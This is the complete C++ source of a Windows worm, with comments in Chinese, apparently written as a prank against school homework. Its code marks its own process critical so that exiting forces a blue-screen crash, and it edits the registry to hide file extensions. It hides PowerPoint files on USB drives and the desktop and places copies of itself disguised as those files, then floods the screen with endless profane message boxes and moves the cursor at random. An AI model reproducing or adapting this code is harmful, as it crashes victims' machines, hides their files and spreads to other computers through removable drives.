#include<Windows.h>
#include<shlobj.h>		// 引用 SHGetSpecialFolderPath
#include<fstream>
#include<thread>
#include<regex>			//正规表达式
//#include<io.h>
#include "main.h"
#include "resource.h"
#pragma comment(lib, "shell32.lib")	// 引用 SHGetSpecialFolderPath
#pragma comment(lib, "Winmm.lib")	// 引用 Windows Multimedia API

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR ipCmdLine, int nCmdShow) 
{
	Crash();
	Infect();
	FuckStart();
	return EXIT_SUCCESS;
}

void Infect()
{
	char LocalPath[MAX_PATH] = { "\0" };
	char LocalDisk[4] = { "\0" };

	Hide_File_Ext();

	GetModuleFileName(NULL, LocalPath, MAX_PATH);
	strncpy_s(LocalDisk, LocalPath, 3);
	if (GetDriveType(LocalDisk) == DRIVE_FIXED)
	{
		Infect_U();
		Infect_Computer();
	}
	else if(GetDriveType(LocalDisk) == DRIVE_REMOVABLE)
		Infect_Computer();
	return;
}

void Infect_U()
{
	vector<string>FileList;
	string U_Path;
	Get_U_Disk(U_Path);				//获取U盘盘符
	if (U_Path.empty())
		return;
	FileSearch(U_Path, FileList);	//遍历U盘根目录及子目录
	if(FileList.empty())
		return;
	Sleep(50);
	for (string& file : FileList)	//感染
		Infect_File(file);
}

void Infect_Computer()
{
	char TablePath[MAX_PATH] = { "\0" };
	vector<string>FileList;
	SHGetSpecialFolderPath(NULL, TablePath, CSIDL_DESKTOPDIRECTORY, NULL);
	FileSearch(TablePath, FileList);
	if (FileList.empty())
		return;
	Sleep(50);
	for (string file : FileList)
		Infect_File(file);
}

void Infect_File(string& file)
{
	string CopyPath = file + ".exe";						//目标路径
	char LocalPath[MAX_PATH] = { "\0" };
	SetFileAttributes(file.c_str(), FILE_ATTRIBUTE_HIDDEN);	//隐藏文件
	GetModuleFileName(NULL, LocalPath, MAX_PATH);			//获取自身路径
	CopyFile(LocalPath, CopyPath.c_str(), FALSE);			//COPY
	Sleep(20);
	return;
}

void Hide_File_Ext()
{
	char TempPath[MAX_PATH];
	GetTempPath(MAX_PATH, TempPath);
	string Path = TempPath;
	ofstream HideBat(Path + "hide.bat", ios::trunc);
	HideBat << "echo off" << endl
		<< "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"HideFileExt\" /t REG_DWORD /d 1 /f";
	HideBat.close();
	ofstream BatStart(Path + "start.bat", ios::trunc);
	BatStart << "echo off" << endl
		<< Path + "hide.bat";
	BatStart.close();

	system(Path.append("start.bat").c_str());
}

void Get_U_Disk(string& U_Path)
{
	DWORD AllDisk = GetLogicalDrives();	//返回一个32位整数，将他转换成二进制后，表示磁盘,最低位为A盘
	if (AllDisk == 0)
		return;
	for (int i = 0; i < 11; i++)		//假定最多有10个磁盘
	{
		if ((AllDisk & 1) == 1)
		{
			U_Path = ('C' + i);
			U_Path += ":\\";
			if (GetDriveType(U_Path.c_str()) == DRIVE_REMOVABLE)	//判断是否是移动磁盘
				return;
		}
		AllDisk = AllDisk >> 1;			//下一个盘符
	}
	if ((AllDisk & 1) != 1)
		return;
}

void FileSearch(string DirPath, vector<string>& FileList)
{
	regex PPTX_File("(.*)(.pptx)");	// *.pptx 

	if (!exists(DirPath))			//检测目录是否存在
		return;
	
	for (auto& DirectoryIter : recursive_directory_iterator(DirPath))	//迭代该路径目录及子目录
	{
		string file;
		if (regex_match(DirectoryIter.path().filename().string(), PPTX_File))
			FileList.push_back(file.assign(DirectoryIter.path().string()));
	}
	return;
}

/*		基于<io.h>,现用<filesystem> std::experimental::filesystem替代	*
void FileSearch(string DirPath, vector<string>& FileList)
{
	string pathName, temp;
	intptr_t hFile = 0;
	struct _finddata_t fileInfo;

	if ((hFile = _findfirst(pathName.assign(DirPath).
		append("\\*").c_str(), &fileInfo)) == -1)
		return;
	do 
	{
		if (fileInfo.attrib&_A_SUBDIR) {
			string fname = fileInfo.name;
			if (fname != ".." && fname != ".") {
				FileSearch(DirPath + "\\" + fname, FileList);
			}
		}
		else {
			if (strstr(fileInfo.name, ".pptx") && !strstr(fileInfo.name, ".exe"))
				FileList.push_back(temp.assign(DirPath).append("\\").append(fileInfo.name));
		}
	} while (_findnext(hFile, &fileInfo) == 0);

	_findclose(hFile);
	return;
}*/

Crashed::~Crashed()
{
	Crash();
}

void Crash()
{
	typedef NTSTATUS(WINAPI *RtlSetProcessIsCritical) (BOOLEAN, PBOOLEAN, BOOLEAN);
	typedef BOOL(WINAPI *RtlAdjustPrivilege) (ULONG, BOOL, BOOL, PBOOLEAN);
	RtlAdjustPrivilege AdjustPrivilege;
	RtlSetProcessIsCritical SetCriticalProcess;
	// 加载 ntdll 以及相关 API
	HANDLE ntdll = LoadLibrary(TEXT("ntdll.dll"));
	AdjustPrivilege = (RtlAdjustPrivilege)GetProcAddress((HINSTANCE)ntdll, "RtlAdjustPrivilege");
	SetCriticalProcess = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
	BOOLEAN b;
	// 进程提升至 Debug 权限，需要 UAC 管理员许可
	AdjustPrivilege(20UL, TRUE, FALSE, &b);
	// 设置为 Critical Process
	SetCriticalProcess(TRUE, NULL, FALSE);
	// 退出，触发 CRITICAL_PROCESS_DIED 蓝屏
	return;
} 

void FuckStart()
{
	thread BGM_thread([]() {
		BGM_Player();
	});
	BGM_thread.detach();

	thread ask_1([&]() { 
		MessageBox(NULL, "傻逼作业真他妈烦人！", "Fuck homework", MB_OK | MB_ICONEXCLAMATION); });
	ask_1.detach();
	Sleep(3000);

	thread ask_2([&]() {
		MessageBox(NULL, "让我们来消灭它吧！", "Fuck homework", MB_OK | MB_ICONERROR); });
	ask_2.detach();
	Sleep(3000);

	thread fuck_1([]() {
		vector<thread>message_thread;
		while (true)
		{
			message_thread.push_back(
				thread([&]() {
					MessageBox(NULL,
						"该死的作业去死吧！\n傻逼应试教育我草你妈！\n还有学校水机贼坑钱！\n出来的水比尿还少！\n你们有钱装那么多摄像头\n我就不信你们没钱换水机！",
						"Fuck homework", MB_OK | MB_ICONERROR);
				})
			);
			Sleep(50);
		}
	});
	thread fuck_2([]() {
		srand((unsigned)time(NULL));
		while (true){
			SetCursorPos(rand() % 1080
				, rand() % 900);
			Sleep(25);
		}
	});
	/*thread fuck_3([]() {
		while (true){
			Sleep(5000);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			Sleep(1500);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
		}
	});*/
	fuck_1.detach();
	fuck_2.detach();
	//fuck_3.detach();
	Sleep(15000);
	return;
}

void BGM_Player()
{
	char tmpmp3[MAX_PATH];
	GetTempPath(MAX_PATH, tmpmp3);
	strcat_s(tmpmp3, "cyka_blyat.mp3");

	if (!ExtractResource(tmpmp3, "MP3", MAKEINTRESOURCE(IDR_MP31)))
		return;

	//打开文件
	string mcicmd;
	mcicmd.assign("open ").append(tmpmp3).append(" alias mymusic");
	mciSendString(mcicmd.c_str(), NULL, 0, NULL);
	// 播放音乐
	mciSendString("play mymusic wait", NULL, 0, NULL);
	return;
}

bool ExtractResource(char* strDstFile, char* strResType, char* strResName)
{
	// 创建文件
	HANDLE hFile = CreateFile(strDstFile, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;

	// 查找资源文件中、加载资源到内存、得到资源大小
	HRSRC    hRes = FindResource(NULL, strResName, strResType);
	HGLOBAL  hMem = LoadResource(NULL, hRes);
	DWORD    dwSize = SizeofResource(NULL, hRes);

	// 写入文件
	DWORD dwWrite = 0; // 返回写入字节
	WriteFile(hFile, hMem, dwSize, &dwWrite, NULL);
	CloseHandle(hFile);

	return true;
}